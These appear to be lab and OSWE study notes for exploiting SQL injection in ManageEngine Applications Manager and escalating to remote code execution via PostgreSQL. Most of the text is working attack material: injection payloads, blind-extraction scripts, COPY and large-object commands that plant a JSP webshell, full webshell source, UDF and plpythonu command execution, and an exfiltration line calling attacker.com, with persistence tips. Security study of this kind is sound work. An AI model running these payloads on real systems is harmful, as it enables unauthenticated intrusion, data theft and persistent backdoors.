## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# ManageEngine SQLi to RCE PoC Notes

## Vulnerability Summary
- **Target**: ManageEngine Applications Manager <= 12900
- **CVE**: Various (version-dependent)
- **Type**: SQL Injection → PostgreSQL RCE
- **Impact**: Unauthenticated Remote Code Execution

## Vulnerability Details

### Root Cause
The AMUserResourcesSyncServlet endpoint contains a SQL injection vulnerability in the `ForMasRange` parameter. The application uses PostgreSQL, which supports stacked queries and powerful functions for file system operations.

### Attack Surface
- **Endpoint**: `/servlet/AMUserResourcesSyncServlet`
- **Parameter**: `ForMasRange`
- **Database**: PostgreSQL 9.x
- **Injection Type**: Time-based and stacked queries

### PostgreSQL Capabilities
PostgreSQL provides several functions useful for exploitation:
- `pg_sleep(seconds)` - Time-based SQLi detection
- `pg_read_file(path)` - Read arbitrary files
- `pg_ls_dir(path)` - List directory contents
- `COPY ... TO 'file'` - Write files (requires SUPERUSER)
- `lo_import() / lo_export()` - Large object file operations

## Lab Setup

### Installation
```bash
# Download ManageEngine Applications Manager build 12900
wget http://archives.manageengine.com/applications_manager/12900/ManageEngine_ApplicationsManager_64bit_12900.bin

# Make executable and install
chmod +x ManageEngine_ApplicationsManager_64bit_12900.bin
./ManageEngine_ApplicationsManager_64bit_12900.bin

# Default installation path
/opt/ManageEngine/AppManager
```

### Configuration
- **Web Interface**: http://localhost:9090
- **Default Credentials**: admin / admin
- **Database**: PostgreSQL (bundled)
- **Web Server**: Tomcat (bundled)
- **Webapp Path**: `/opt/ManageEngine/AppManager/working/apache-tomcat/webapps/ROOT/`

## Exploit Chain

### Stage 1: SQLi Detection
```bash
# Test for time-based SQLi
curl "http://target:9090/servlet/AMUserResourcesSyncServlet?ForMasRange=1'%20AND%20pg_sleep(5)--"

# If vulnerable, response will delay 5 seconds
```

### Stage 2: Database Enumeration
```sql
-- PostgreSQL version
SELECT VERSION()

-- Current database
SELECT CURRENT_DATABASE()

-- Current user
SELECT CURRENT_USER

-- Check if SUPERUSER (required for COPY)
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER
```

### Stage 3: File Operations

**Read Files:**
```sql
-- Read /etc/passwd
SELECT pg_read_file('/etc/passwd', 0, 10000)

-- Read application config
SELECT pg_read_file('/opt/ManageEngine/AppManager/conf/database_params.conf', 0, 100000)
```

**List Directories:**
```sql
-- List webroot
SELECT pg_ls_dir('/opt/ManageEngine/AppManager/working/apache-tomcat/webapps/ROOT/')
```

**Write Files (SUPERUSER required):**
```sql
-- Write JSP shell using COPY
COPY (SELECT '<%@ page import="java.io.*" %><% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()).useDelimiter("\\A").next()); %>')
TO '/opt/ManageEngine/AppManager/working/apache-tomcat/webapps/ROOT/shell.jsp';

-- Alternative: Large Objects
SELECT lo_from_bytea(0, decode('3c25206f75742e7072696e746c6e28227368656c6c22293b2025>','hex'));
SELECT lo_export(123456, '/path/to/shell.jsp');
```

### Stage 4: RCE via JSP Shell
```java
// Minimal JSP webshell
<%@ page import="java.io.*" %>
<%
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = r.readLine()) != null) {
        out.println(line);
    }
%>
```

## Testing Commands

```bash
# Basic SQLi test with timing
python3 poc.py --target-ip 192.168.1.100 --target-port 9090

# With Burp proxy for debugging
python3 poc.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080

# Custom delay for slow networks
python3 poc.py --target-ip 192.168.1.100 --delay 5

# Use sqlmap for automated exploitation
sqlmap -u "http://target:9090/servlet/AMUserResourcesSyncServlet?ForMasRange=1" \
    --batch --dbms=postgresql --technique=T --time-sec=5 \
    --file-write=shell.jsp --file-dest=/path/to/webroot/shell.jsp
```

## Blind SQLi Data Extraction

### Extract Database Version
```python
# Length extraction
payload = "ForMasRange=1' AND (SELECT CASE WHEN (LENGTH(VERSION())>X) THEN pg_sleep(3) ELSE pg_sleep(0) END)--"

# Character-by-character extraction
for position in range(1, length+1):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789.':
        payload = f"ForMasRange=1' AND (SELECT CASE WHEN (SUBSTRING(VERSION() FROM {position} FOR 1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
        # If response delays, char is correct
```

### Binary Search Optimization
```python
# More efficient than character-by-character
def binary_search_char(position):
    min_char, max_char = 32, 126  # ASCII printable range
    while min_char <= max_char:
        mid = (min_char + max_char) // 2
        payload = f"ForMasRange=1' AND (SELECT CASE WHEN (ASCII(SUBSTRING(VERSION() FROM {position} FOR 1))>{mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
        if delays():
            min_char = mid + 1
        else:
            max_char = mid - 1
    return chr(min_char)
```

## PostgreSQL RCE Techniques

### Method 1: COPY Command (SUPERUSER)
```sql
COPY (SELECT 'shell content') TO '/path/to/shell.jsp';
```

### Method 2: Large Objects
```sql
SELECT lo_from_bytea(0, 'shell content');
SELECT lo_export(oid, '/path/to/shell.jsp') FROM pg_largeobject;
```

### Method 3: UDF (User Defined Functions)
```sql
-- Create C library for command execution
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id > /tmp/output.txt');
```

### Method 4: plpythonu
```sql
-- If plpythonu is installed
CREATE LANGUAGE plpythonu;
CREATE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
import os
return os.popen(cmd).read()
$$ LANGUAGE plpythonu;
SELECT exec_cmd('whoami');
```

## Debugging

### If SQLi Doesn't Delay
- Check network latency (adjust delay parameter)
- Verify PostgreSQL is the backend
- Try boolean-based instead of time-based
- Check for WAF/IDS interference

### If File Write Fails
- Verify SUPERUSER privileges: `SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER`
- Check file permissions on target directory
- Try alternative paths (Windows vs Linux)
- Use large objects instead of COPY

### Alternative RCE Methods
If file write fails:
1. **DNS Exfiltration**: `COPY (SELECT 'data') TO PROGRAM 'nslookup data.attacker.com'`
2. **HTTP Callback**: Use `wget` or `curl` via PROGRAM
3. **cron Job**: Write to `/etc/cron.d/`
4. **SSH Keys**: Write to `~/.ssh/authorized_keys`

## Mitigation

### Developer Fix
```java
// Use PreparedStatement instead of string concatenation
PreparedStatement pstmt = conn.prepareStatement(
    "SELECT * FROM table WHERE id = ?"
);
pstmt.setInt(1, userInput);
ResultSet rs = pstmt.executeQuery();
```

### PostgreSQL Hardening
```sql
-- Revoke SUPERUSER from application account
ALTER USER appuser NOSUPERUSER;

-- Disable dangerous functions
DROP FUNCTION IF EXISTS pg_read_file(text, bigint, bigint);
DROP FUNCTION IF EXISTS pg_ls_dir(text);

-- Restrict file operations
-- Edit postgresql.conf: allow_system_table_mods = off
```

## References
- https://blog.jamesotten.com/post/applications-manager-rce/
- https://www.postgresql.org/docs/9.4/sql-copy.html
- https://www.postgresql.org/docs/9.4/largeobjects.html
- https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b

## OSWE Exam Notes

### Key Takeaways
1. **PostgreSQL is powerful** - Many functions beyond SELECT
2. **Stacked queries** - PostgreSQL supports multiple statements
3. **File operations** - COPY, large objects, pg_read_file()
4. **Blind SQLi extraction** - Binary search is faster than linear
5. **JSP shells** - Learn Java/JSP syntax for webshells

### Time Management
- SQLi detection: 10 min
- Database enumeration: 15 min
- File write exploitation: 20 min
- Shell access: 10 min
- Total: ~55 minutes

### Critical Code Snippets

**JSP Command Execution:**
```jsp
<%= Runtime.getRuntime().exec(request.getParameter("c")) %>
```

**PostgreSQL Sleep:**
```sql
SELECT pg_sleep(5)
```

**Hex Encoding for File Content:**
```python
hex_content = shell_content.encode().hex()
# Then: decode('{hex_content}', 'hex')
```

### Exam Checklist
- [ ] Confirm SQLi with timing attack
- [ ] Determine database type (PostgreSQL)
- [ ] Check for SUPERUSER privileges
- [ ] Identify web application directory
- [ ] Craft JSP webshell
- [ ] Write shell via COPY or lo_export
- [ ] Access shell and execute commands
- [ ] Document with screenshots

### Common Pitfalls
1. Forgetting to URL-encode payloads
2. Not checking SUPERUSER status before COPY
3. Wrong file path (Linux vs Windows)
4. JSP syntax errors in webshell
5. Not handling special characters in SQL strings
